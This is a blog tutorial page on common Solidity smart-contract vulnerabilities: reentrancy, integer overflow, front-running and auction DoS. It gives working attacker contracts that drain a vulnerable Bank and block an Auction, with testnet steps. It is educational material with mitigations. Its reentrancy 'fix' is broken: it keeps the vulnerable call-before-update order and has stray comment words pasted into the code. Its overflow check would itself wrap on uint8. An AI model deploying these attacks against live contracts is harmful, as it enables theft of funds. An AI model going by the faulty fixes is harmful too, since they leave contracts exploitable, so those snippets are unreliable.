@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Solidity Vulnerabilities :: Somesh&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introduction Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.
+However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable." />
+<meta name="keywords" content="Solidity, Ethereum, Smart-Contract" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://somesh-banerjee.github.io/blogs/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://somesh-banerjee.github.io/blogs/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://somesh-banerjee.github.io/blogs/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://twitter.com/banerjee_somesh" />
+  
+    <meta name="twitter:creator" content="banerjee_somesh" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Solidity Vulnerabilities">
+<meta property="og:description" content="Introduction Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.
+However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable." />
+<meta property="og:url" content="https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/" />
+<meta property="og:site_name" content="Somesh&#39;s Blog" />
+
+  
+  
+  <meta property="og:image" content="https://somesh-banerjee.github.io/blogs/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-06-08 23:35:09 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blogs/">
+  <div class="logo">
+    Somesh&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://somesh-banerjee.github.io/">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://somesh-banerjee.github.io/" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/">Solidity Vulnerabilities</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2022-06-08</time><span class="post-author">Somesh Banerjee</span><span class="post-reading-time">9 min read (1712 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://somesh-banerjee.github.io/blogs/tags/solidity/">Solidity</a>&nbsp;
+      
+      #<a href="https://somesh-banerjee.github.io/blogs/tags/solidity-vulnerabilities/">Solidity-Vulnerabilities</a>&nbsp;
+      
+      #<a href="https://somesh-banerjee.github.io/blogs/tags/smart-contract-vulnerabilities/">Smart-Contract-Vulnerabilities</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.</p>
+<p>However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable.</p>
+<p>In this article, I will go through some of the common solidity vulnerabilities in detail. We will try to recreate the  vulnerabilities in the contract to understand it and also discuss how to mitigate these pitfalls.</p>
+<h1 id="re-entrancy-attack">Re-entrancy attack<a href="#re-entrancy-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Re-entrancy attack is a type of attack where the malicious contract re-enters the target contract by calling the target contract&rsquo;s function before the completion of its current execution.</p>
+<p>To understabd how it is happening, let&rsquo;s understand it by considering contracts as persons. Imagine Person B who acts as a bank and maintain a registry for tracking the balance of other people. Now a malicious Person H deposits 100 money to B. B updates H&rsquo;s balance in the registry to 100. Other persons have also deposited to B and the total value depositted is 1200.</p>
+<p>Whenever anybody withdraw money from B, he first gives the money and then update it in the registry. Now imagine H withdraws his money i.e. 100, and before it gets updated he agains withdraw it. Since the registry is not updated he agains get 100. H continues withdrawing until B has 0 balance.</p>
+<p>This sounds absurd in real life, that a person withdraws but he can withdraw again before the registry gets updated, but in smart contract, this is possible using <code>fallback</code> functions. There is a function called <code>receive()</code> which gets called everytime some ether is transferred to a contract.</p>
+<p>Let create a vulnerable contract Bank and try to recreate the attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">pragma solidity <span style="color:#f92672">^</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">8</span><span style="color:#f92672">.</span><span style="color:#a6e22e">7</span><span style="color:#f92672">;</span>
+
+contract Bank <span style="color:#f92672">{</span>
+    mapping <span style="color:#f92672">(</span>address <span style="color:#f92672">=&gt;</span> uint256<span style="color:#f92672">)</span> userBalance<span style="color:#f92672">;</span>
+   
+   <span style="color:#75715e">// returns the balance of the user passed as parameter
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">getBalance</span><span style="color:#f92672">(</span>address u<span style="color:#f92672">)</span> <span style="color:#66d9ef">public</span> view <span style="color:#a6e22e">returns</span><span style="color:#f92672">(</span>uint256<span style="color:#f92672">){</span>
+        <span style="color:#66d9ef">return</span> userBalance<span style="color:#f92672">[</span>u<span style="color:#f92672">];</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#75715e">// returns the balance of the contract
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">getBalance</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">public</span> view <span style="color:#a6e22e">returns</span><span style="color:#f92672">(</span>uint256<span style="color:#f92672">){</span>
+        <span style="color:#66d9ef">return</span> address<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">).</span><span style="color:#a6e22e">balance</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#75715e">// deposit the amount passed with the call to the balance of the user
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">addToBalance</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">public</span> payable<span style="color:#f92672">{</span>
+        userBalance<span style="color:#f92672">[</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">]</span> <span style="color:#f92672">+=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>   
+
+    <span style="color:#75715e">// withdraw the whole balance of the user
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">withdrawBalance</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">public</span> payable  <span style="color:#f92672">{</span>
+        <span style="color:#f92672">(</span>bool sent<span style="color:#f92672">,</span> <span style="color:#f92672">)</span> <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">.</span><span style="color:#a6e22e">call</span><span style="color:#f92672">{</span>value<span style="color:#f92672">:</span> userBalance<span style="color:#f92672">[</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">]}(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">);</span>
+        userBalance<span style="color:#f92672">[</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>   
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Now we will create the Attacker contract, that will drain the Bank contract using the <code>receive</code> fallback function</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span>pragma solidity <span style="color:#f92672">^</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">8</span><span style="color:#f92672">.</span><span style="color:#a6e22e">7</span><span style="color:#f92672">;</span>
+
+contract Hacker <span style="color:#f92672">{</span>
+    Bank bank<span style="color:#f92672">;</span>
+
+    constructor<span style="color:#f92672">(</span>address _a<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        bank <span style="color:#f92672">=</span> Bank<span style="color:#f92672">(</span>_a<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+    
+    <span style="color:#75715e">// returns the balance of the contract
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">getBalance</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">public</span> view <span style="color:#a6e22e">returns</span><span style="color:#f92672">(</span>uint256<span style="color:#f92672">){</span>
+        <span style="color:#66d9ef">return</span> address<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">).</span><span style="color:#a6e22e">balance</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#75715e">// attack the bank contract
+</span><span style="color:#75715e"></span>    function <span style="color:#a6e22e">attack</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">public</span> payable <span style="color:#f92672">{</span>
+        require<span style="color:#f92672">(</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;=</span> 1 ether<span style="color:#f92672">);</span> 
+        bank<span style="color:#f92672">.</span><span style="color:#a6e22e">addToBalance</span><span style="color:#f92672">{</span>value<span style="color:#f92672">:</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span><span style="color:#f92672">}();</span>
+        bank<span style="color:#f92672">.</span><span style="color:#a6e22e">withdrawBalance</span><span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#75715e">// fallback function which is called when the bank contract sends the ether
+</span><span style="color:#75715e"></span>    receive<span style="color:#f92672">()</span> external payable <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>bank<span style="color:#f92672">.</span><span style="color:#a6e22e">getBalance</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">){</span>
+            bank<span style="color:#f92672">.</span><span style="color:#a6e22e">withdrawBalance</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>To understand the flow, first deploy the <code>Bank</code> contract in the testnet and deposit 1 or more ether from multiple accounts/wallets. Now deploy the <code>Hacker</code> contract. Pass the <code>Bank</code> contract&rsquo;s address while deploying. Call the <code>attack()</code> function of the <code>Hacker</code> contract with 1 ether value. After the call, you will notice that the balance of <code>Bank</code> contract will be 0 and all the ether which was in <code>Bank</code> is transferred to <code>Hacker</code>.</p>
+<p>What is happening here is, when we call the <code>attack()</code> function, the <code>Hacker</code> contract first deposits 1 ether in the <code> Bank</code> contract. After that <code>Hacker</code> calls the <code>Bank.withdrawBalance()</code> function. By calling the <code>withdrawBalance()</code> function, the <code>Bank</code> transfers the userBalnce of <code>Hacker</code> i.e. 1 ether to <code>Hacker</code>.</p>
+<p>Now in <code>Hacker</code> we have defined the fallback function <code>receive()</code> which is called when the 1 ether is transferred to the contract. In the <code>receive()</code> function, we are again calling the <code>withdrawBalance()</code>.</p>
+<p>Now understand the <code>withdrawBalance()</code> function flow in this case from the following snippet</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdrawBalance</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span>  {
+    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">sent</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userBalance</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>]}(<span style="color:#e6db74">&#34;&#34;</span>);
+    <span style="color:#75715e">// . --&gt; receive() is called at his point after transferring and before updating the userBalance
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">userBalance</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+}  
+</code></pre></div><p>From the above snippet you can understand, that wen the <code>receive()</code> is being called the <code>userBalace</code> mapping is not yet updated. Hence again 1 ether will be transferred. This transfer will again triger the <code>receive()</code> and the process will go on recursively till it totally drains the <code>Bank</code> contract.</p>
+<h4 id="how-to-mitigate">How to mitigate<a href="#how-to-mitigate" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>To mitigate the reentrancy attack in the above scenario, we can just change the order of execution as follw:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdrawBalance</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span>  {
+    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">sent</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userBalance</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>]}(<span style="color:#e6db74">&#34;&#34;</span>);<span style="color:#a6e22e">transferring</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">before</span> <span style="color:#a6e22e">updating</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">userBalance</span>
+    <span style="color:#a6e22e">userBalance</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+} 
+</code></pre></div><p>Now if the Hacker recursively calls the <code>withdrawBalance()</code> function, no ether will be transferred as the mapping is updated. So to avoid reentrancy first update the state variables and then interact with external contracts/wallets.</p>
+<p>Another way to prevent reentrancy is by using reentrancy guard. You can use state variables and modifier to design a guard, that will lock the function untill the execution is complete. For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">nonReentrant</span>() {
+    <span style="color:#a6e22e">require</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">locked</span>, <span style="color:#e6db74">&#34;Reentrant call detected&#34;</span>);
+    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+    <span style="color:#a6e22e">_</span>;
+    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+}
+</code></pre></div><p>Also you can use <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">Openzeppelin ReentrancyGuard</a> instead of creating your own modifier.</p>
+<h1 id="integer-overflow">Integer Overflow<a href="#integer-overflow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Overflow occurs when we exceed the limit of any variable. For example <code>uint8</code> can store value between 0 to 255, and if we try to store 256, it will store it as 0. We can try this by writing the following contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">pragma solidity <span style="color:#f92672">^</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">7</span><span style="color:#f92672">.</span><span style="color:#a6e22e">0</span><span style="color:#f92672">;</span>
+
+contract Overflow <span style="color:#f92672">{</span>
+    uint8 <span style="color:#66d9ef">public</span> val <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+    
+    function <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>uint8 value<span style="color:#f92672">)</span> external <span style="color:#f92672">{</span>
+        val <span style="color:#f92672">+=</span> value<span style="color:#f92672">;</span> <span style="color:#75715e">// possible overflow
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span> 
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Try adding 255 and check the value. It will show 255. Now if you add 1, <code>val</code> will become 0.</p>
+<h4 id="how-to-mitigate-1">How to mitigate<a href="#how-to-mitigate-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The best way to avoid overflow is to upgrade solidity version to 0.8.0 or later, to get built-in protection against overflow and underflow.</p>
+<p>Moreover you can perform check before performing a calculation like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">pragma solidity <span style="color:#f92672">^</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">7</span><span style="color:#f92672">.</span><span style="color:#a6e22e">0</span><span style="color:#f92672">;</span>
+
+contract Overflow <span style="color:#f92672">{</span>
+    uint8 <span style="color:#66d9ef">public</span> val <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span>
+    
+    function <span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>uint8 value<span style="color:#f92672">)</span> external <span style="color:#f92672">{</span>
+        require<span style="color:#f92672">(</span>val <span style="color:#f92672">+</span> value <span style="color:#f92672">&lt;=</span> 255<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Overflow&#34;</span><span style="color:#f92672">);</span>
+        val <span style="color:#f92672">+=</span> value<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span> 
+<span style="color:#f92672">}</span>
+</code></pre></div><h1 id="race-condition">Race Condition<a href="#race-condition" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>In Ethereum or any other chain, every transaction is first added to the mempool and then a miner adds the transaction to the blockchain while mining. There is a time gap of around 10 seconds or more between this two process: sending a transaction and getting it accepted into blockchain.</p>
+<p>To recreate the flaw, let create the following scenario:</p>
+<p>Deploy a ERC20 token as follow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> <span style="color:#960050;background-color:#1e0010">&#34;@</span>openzeppelin<span style="color:#f92672">/</span>contracts<span style="color:#f92672">/</span>token<span style="color:#f92672">/</span>ERC20<span style="color:#f92672">/</span>ERC20<span style="color:#f92672">.</span><span style="color:#a6e22e">sol</span><span style="color:#e6db74">&#34;;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">contract LOL is ERC20 {
+</span><span style="color:#e6db74">    constructor() ERC20(&#34;</span>LOL<span style="color:#e6db74">&#34;, &#34;</span>LOL<span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        _mint<span style="color:#f92672">(</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">,</span> 100000<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Now deploy a <code>Marketplace</code> contract which uses the above ERC20 token buying and selling:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">contract MarketPlace <span style="color:#f92672">{</span>
+    address <span style="color:#66d9ef">public</span> owner<span style="color:#f92672">;</span>
+    mapping<span style="color:#f92672">(</span>uint256 <span style="color:#f92672">=&gt;</span> uint256<span style="color:#f92672">)</span> <span style="color:#66d9ef">public</span> prices<span style="color:#f92672">;</span>
+    mapping<span style="color:#f92672">(</span>uint256 <span style="color:#f92672">=&gt;</span> address<span style="color:#f92672">)</span> <span style="color:#66d9ef">public</span> holder<span style="color:#f92672">;</span>
+    LOL lol<span style="color:#f92672">;</span>
+
+    constructor<span style="color:#f92672">(</span>address a_<span style="color:#f92672">){</span>
+        owner <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">;</span>
+        lol <span style="color:#f92672">=</span> LOL<span style="color:#f92672">(</span>a_<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+
+    function <span style="color:#a6e22e">buy</span><span style="color:#f92672">(</span>uint256 id<span style="color:#f92672">)</span> external <span style="color:#f92672">{</span>
+        lol<span style="color:#f92672">.</span><span style="color:#a6e22e">transferFrom</span><span style="color:#f92672">(</span>msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">,</span> owner<span style="color:#f92672">,</span> prices<span style="color:#f92672">[</span>id<span style="color:#f92672">]);</span>
+        holder<span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    function <span style="color:#a6e22e">changeprice</span><span style="color:#f92672">(</span>uint256 id<span style="color:#f92672">,</span> uint256 new_price<span style="color:#f92672">)</span> external <span style="color:#f92672">{</span>
+        prices<span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> new_price<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>First use <code>changePrice(1,10)</code> to set price of id 1 to 10. Now use two different metamask wallets, let A and B to do the attack. A will change the price and B will buy the id 1.
+Before performing this approve <code>Marketplace</code> contract for spending the ERC20 token on behalf of B, using the <code>approve(spender,amount)</code> function. Set the amount higher than the price to make the attack possible. To be safe always approve only the price in real scenarios.</p>
+<p>Now call the following functions in order:</p>
+<ol>
+<li><code>buy(1)</code> from B with lower gasprice, so that it takes more time to get accepted. Remember at this point the price of id 1 is 10, so 10 should be deducted from B&rsquo;s wallet.</li>
+<li><code>changePrice(1,50)</code> from A with higher gasprice, so that it is accepted instantly.</li>
+</ol>
+<p>After both the transactions are complete, you will see 50 is deducted from B wallet.</p>
+<h4 id="scenario-2">Scenario 2<a href="#scenario-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>There can be another scenario for this attack. Imagine you created a Quiz contract and the first one to respond with correct answer wins ether. Now a valid winner submits his answer in the mempool. A malicious miner notice that transaction, copies the values and send a transaction with the correct answer. If the miner&rsquo;s transaction gets added to the block, he will win the ether instead of the actual winner.</p>
+<h4 id="how-to-mitigate-2">How to mitigate<a href="#how-to-mitigate-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>We can&rsquo;t prevent front-run but we can follow necessary steps based on the scenario.
+For example in the first scenario, only approve for the amount shown as price.
+In the second scenario, we can use some kind of encryption to hide the answer from public.</p>
+<h1 id="dos-attacks">DoS Attacks<a href="#dos-attacks" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>DoS Attack occurs when a malicious hacker succeeds in creating a scenario where your contract functions always fails. For example if we consider the following <code>Auction</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">pragma solidity <span style="color:#f92672">^</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">8</span><span style="color:#f92672">.</span><span style="color:#a6e22e">7</span><span style="color:#f92672">;</span>
+
+contract Auction <span style="color:#f92672">{</span>
+    address <span style="color:#66d9ef">public</span> curWinner<span style="color:#f92672">;</span>
+    uint256 <span style="color:#66d9ef">public</span> curBid<span style="color:#f92672">;</span>
+    
+    function <span style="color:#a6e22e">bid</span><span style="color:#f92672">()</span> payable external <span style="color:#f92672">{</span>
+        uint256 value <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span><span style="color:#f92672">;</span>
+        require<span style="color:#f92672">(</span>value <span style="color:#f92672">&gt;</span> curBid<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>curWinner <span style="color:#f92672">!=</span> address<span style="color:#f92672">(</span>0<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+            payable<span style="color:#f92672">(</span>curWinner<span style="color:#f92672">).</span><span style="color:#a6e22e">transfer</span><span style="color:#f92672">(</span>curBid<span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span>
+        curWinner <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">sender</span><span style="color:#f92672">;</span>
+        curBid <span style="color:#f92672">=</span> value<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span> 
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Here while bidding, the function first send the value of 2nd highest bid back and then updates the <code>curBid</code> and <code>curWinner</code>. If a hacker creates a contract through which he can place a bid but any transfer back to the contract will always fail then the winner will never update and he will be winner with any bid. The hacker can achive that using the following <code>Attacker</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">contract Attacker<span style="color:#f92672">{</span>
+    Auction auction<span style="color:#f92672">;</span>
+
+    constructor<span style="color:#f92672">(</span>address a<span style="color:#f92672">){</span>
+        auction <span style="color:#f92672">=</span> Auction<span style="color:#f92672">(</span>a<span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+
+    function <span style="color:#a6e22e">placeBid</span><span style="color:#f92672">()</span> payable external <span style="color:#f92672">{</span>
+        auction<span style="color:#f92672">.</span><span style="color:#a6e22e">bid</span><span style="color:#f92672">{</span>value<span style="color:#f92672">:</span> msg<span style="color:#f92672">.</span><span style="color:#a6e22e">value</span><span style="color:#f92672">}();</span>
+    <span style="color:#f92672">}</span>
+
+    receive<span style="color:#f92672">()</span> external payable  <span style="color:#f92672">{</span>
+        revert<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hacked&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>In <code>Attacker</code> contract, ether cannot be transferred back as the fallback function <code>receive()</code> will always revert it.</p>
+<p>Another scenario includes looping over dynamic size arrays. If the array becomes too large than it will run out of gas and revert.</p>
+<h4 id="how-to-mitigate-3">How to mitigate<a href="#how-to-mitigate-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>To avoid function failure due to transfer failure, implement pull over push pattern. In this pattern, you will not send the amount while calling the <code>bid()</code> function but a separate function will be there so that the losing bidders can withdraw their bids.</p>
+<p><strong>References:</strong></p>
+<ol>
+<li><a href="https://github.com/crytic/not-so-smart-contracts">(Not So) Smart Contracts</a></li>
+<li><a href="https://medium.com/coinmonks/smart-contracts-common-vulnerabilities-solidity-e64c5506b7f4">Smart Contracts common vulnerabilities (solidity)</a></li>
+</ol>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/blogs/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
